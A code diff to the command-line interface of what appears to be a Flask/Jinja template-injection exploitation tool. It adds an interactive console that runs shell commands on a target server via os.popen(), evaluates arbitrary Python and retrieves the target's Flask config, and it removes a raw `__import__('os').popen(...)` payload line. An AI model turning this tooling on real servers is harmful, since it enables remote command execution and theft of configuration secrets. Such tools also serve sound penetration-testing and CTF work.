@@ -2,6 +2,7 @@
 
 """
 import logging
+import time
 
 from urllib.parse import urlparse
 from typing import Callable, List, Dict, Tuple, Union
@@ -12,13 +13,15 @@ import click
 from .const import (
     ENVIRONMENT_FLASK,
     OS_POPEN_READ,
-    DEFAULT_USER_AGENT,
     CONFIG,
+    EVAL,
+    STRING,
+    DEFAULT_USER_AGENT,
     DETECT_MODE_ACCURATE,
     REPLACED_KEYWORDS_STRATEGY_IGNORE,
 )
 from .colorize import colored, set_enable_coloring
-from .cracker import Cracker
+from .cracker import Cracker, EvalArgsModePayloadGen
 from .form import Form, get_form
 from .full_payload_gen import FullPayloadGen
 from .requester import Requester
@@ -44,6 +47,30 @@ TITLE = colored(
     ),
     bold=True,
 )
+INTERACTIVE_MODE_HELP = """
+{english_title}:
+- Command Execution: type to execute shell command with os.popen()
+- Python Eval: use {eval_help} to eval python expression on the target server
+- Get Config: use {get_config_help} to get the config of the target server
+- Press {exit_help} to exit
+{chinese_title}：
+- 命令执行：输入任意命令即可在目标上用os.popen()执行
+- Python Eval：使用{eval_help}来eval任意python表达式
+- 配置获取：使用{get_config_help}来获得目标的flask config
+- 按下{exit_help}退出
+{example_title}:
+$>> ls /
+$>> %%eval 1+2+3+100000
+$>> %%get-config
+
+""".format(
+    english_title = colored("yellow", "Interactive Console", bold=True),
+    chinese_title = colored("yellow", "交互终端", bold=True),
+    example_title = colored("yellow", "Example/示例", bold=True),
+    eval_help=colored("cran", "%%eval <expression>"),
+    get_config_help=colored("cran", "%%get-config"),
+    exit_help=colored("cran", "Ctrl+D"),
+)
 LOGGING_FORMAT = "%(levelname)s:[%(name)s] | %(message)s"
 logging.basicConfig(level=logging.INFO, format=LOGGING_FORMAT)
 logger = logging.getLogger("cli")
@@ -53,20 +80,37 @@ class RunFailed(Exception):
     """用于通知main和unit test运行失败的exception"""
 
 
-def cmd_exec_submitter(
-    cmd: str, submitter: Submitter, full_payload_gen: FullPayloadGen
+def do_submit_cmdexec(
+    cmd: str,
+    submitter: Submitter,
+    full_payload_gen_like: Union[FullPayloadGen, EvalArgsModePayloadGen],
 ) -> str:
     """使用FullPayloadGen生成shell命令payload, 然后使用submitter发送至对应服务器, 返回回显
+    如果cmd以%>开头，则将其作为fenjing内部命令解析
+
+    内部命令如下：
+    - get-config: 获得当前的config
+    - eval: 让目标python进程执行eval，解析命令后面的部分
 
     Args:
         cmd (str): payload对应的命令
         submitter (Submitter): 实际发送请求的submitter
-        full_payload_gen (FullPayloadGen): 生成payload的FullPayloadGen
+        full_payload_gen_like (FullPayloadGen): 生成payload的FullPayloadGen
 
     Returns:
         str: 回显
     """
-    payload, will_print = full_payload_gen.generate(OS_POPEN_READ, cmd)
+    payload, will_print = None, None
+    if cmd[:2] == "%%":
+        cmd = cmd[2:]
+        if cmd.startswith("get-config"):
+            payload, will_print = full_payload_gen_like.generate(CONFIG)
+        elif cmd.startswith("eval"):
+            payload, will_print = full_payload_gen_like.generate(
+                EVAL, STRING, cmd[4:].strip()
+            )
+    else:
+        payload, will_print = full_payload_gen_like.generate(OS_POPEN_READ, cmd)
     if payload is None:
         logger.warning("%s generating payload.", colored("red", "Failed"))
         return ""
@@ -81,40 +125,13 @@ def cmd_exec_submitter(
     return result.text
 
 
-def cmd_exec_generate_func(
-    cmd: str, submitter: Submitter, generate_func: Callable, will_print: bool
-) -> str:
-    """使用submitter和generate_func函数生成并提交cmd对应的payload
-
-    Args:
-        cmd (str): payload对应的shell command
-        submitter (Submitter): 实际发送HTTP请求，提交payload的实例
-        generate_func (Callable): 接受一个string, 生成对应payload的函数
-        will_print (bool): payload是否会生成回显
-
-    Returns:
-        str: 提交结果
-    """
-    payload = generate_func(cmd)
-    if payload is None:
-        logger.warning("%s generating payload.", colored("red", "Failed"))
-        return ""
-    logger.info("Submit payload %s", colored("blue", payload))
-    if not will_print:
-        payload_wont_print = "This payload %s command execution result."
-        logger.warning(payload_wont_print, colored("red", "won't print"))
-    result = submitter.submit(payload)
-    assert result is not None
-    return result.text
-
-
 def interact(cmd_exec_func: Callable):
     """根据提供的payload生成方法向用户提供一个交互终端
 
     Args:
         cmd_exec_func (Callable): 根据输入的shell命令生成对应的payload
     """
-    logger.info("Use %s to exit.", colored("cran", "Ctrl+D", bold=True))
+    print(INTERACTIVE_MODE_HELP)
     while True:
         try:
             cmd = input("$>> ")
@@ -204,7 +221,7 @@ def do_crack_form_eval_args_pre(
     replaced_keyword_strategy: str,
     environment: str,
     tamper_cmd: Union[str, None],
-) -> Union[Tuple[Submitter, bool], None]:
+) -> Union[Tuple[Submitter, Union[FullPayloadGen, EvalArgsModePayloadGen]], None]:
     """攻击一个表单并获得结果，但是将payload放在GET/POST参数中提交
 
     Args:
@@ -235,8 +252,8 @@ def do_crack_form_eval_args_pre(
         )
         result = cracker.crack_eval_args()
         if result:
-            _, submitter, will_print = result
-            return submitter, will_print
+            submitter, evalargs_payload_gen = result
+            return submitter, evalargs_payload_gen
     return None
 
 
@@ -285,9 +302,9 @@ def do_crack(
         exec_cmd (Union[str, None]): 需要执行的命令
     """
     cmd_exec_func = partial(
-        cmd_exec_submitter,
+        do_submit_cmdexec,
         submitter=submitter,
-        full_payload_gen=full_payload_gen,
+        full_payload_gen_like=full_payload_gen,
     )
     if exec_cmd:
         print(cmd_exec_func(exec_cmd))
@@ -296,20 +313,21 @@ def do_crack(
 
 
 def do_crack_eval_args(
-    submitter: Submitter, will_print: bool, exec_cmd: Union[str, None]
+    submitter: Submitter,
+    eval_args_payloadgen: EvalArgsModePayloadGen,
+    exec_cmd: Union[str, None],
 ):
     """攻击对应的表单参数/路径，但是使用eval_args方法
 
     Args:
         submitter (Submitter): payload提交器，用于提交payload到特定的表单/路径
-        will_print (bool): 是否会产生回显
+        eval_args_payloadgen (EvalArgsModePayloadGen): EvalArgs的payload生成器
         exec_cmd (Union[str, None]): 需要执行的命令
     """
     cmd_exec_func = partial(
-        cmd_exec_generate_func,
+        do_submit_cmdexec,
         submitter=submitter,
-        generate_func=lambda x: f"__import__('os').popen({repr(x)}).read()",
-        will_print=will_print,
+        full_payload_gen_like=eval_args_payloadgen,
     )
     if exec_cmd:
         print(cmd_exec_func(exec_cmd))
@@ -391,6 +409,11 @@ def get_config(
     攻击指定的表单，并获得目标服务器的flask config
     """
     print(TITLE)
+    print(
+        "This command is DEPRECATED, you should just pass `-e '%%get-config'` to\ncrack command for the flask config of the target"
+    )
+    print("`get-config`命令即将废弃，请在crack命令上使用`-e '%%get-config'`参数获得目标的flask config")
+    time.sleep(10)
     assert all(param is not None for param in [url, inputs]), "Please check your param"
     form = get_form(
         action=action or urlparse(url).path,
@@ -513,8 +536,8 @@ def crack(
         if not result:
             logger.warning("Test form failed...")
             raise RunFailed()
-        submitter, will_print = result
-        do_crack_eval_args(submitter, will_print, exec_cmd)
+        submitter, evalargs_payload_gen = result
+        do_crack_eval_args(submitter, evalargs_payload_gen, exec_cmd)
 
 
 @main.command()
